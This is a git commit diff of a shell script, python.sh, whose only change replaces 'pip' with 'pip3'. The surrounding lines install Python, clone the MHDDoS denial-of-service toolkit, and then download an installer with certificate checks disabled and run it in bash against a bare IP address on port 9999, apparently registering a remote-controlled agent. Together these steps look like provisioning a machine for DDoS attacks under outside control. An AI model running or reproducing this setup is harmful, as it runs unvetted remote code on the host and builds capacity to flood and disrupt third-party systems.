17a815694ef7af78619e2328daaed6b1cf0004db
tangwne215 <1171681475@qq.com>
2023-06-26 19:47:54 +0800

    Update python.sh

--- python.sh
+++ python.sh
@@ -7,5 +7,5 @@ source ~/.bashrc
 pyenv install 3.10.4
 git clone https://github.com/MatrixTM/MHDDoS.git
 cd MHDDoS
-pip install -r requirements.txt
+pip3 install -r requirements.txt
 wget --no-check-certificate https://www.wgstart.com/download/sh/installAgent.sh; bash installAgent.sh http://66.42.48.158:9999 agent-linux-amd64-v3.4.7.tar.gz
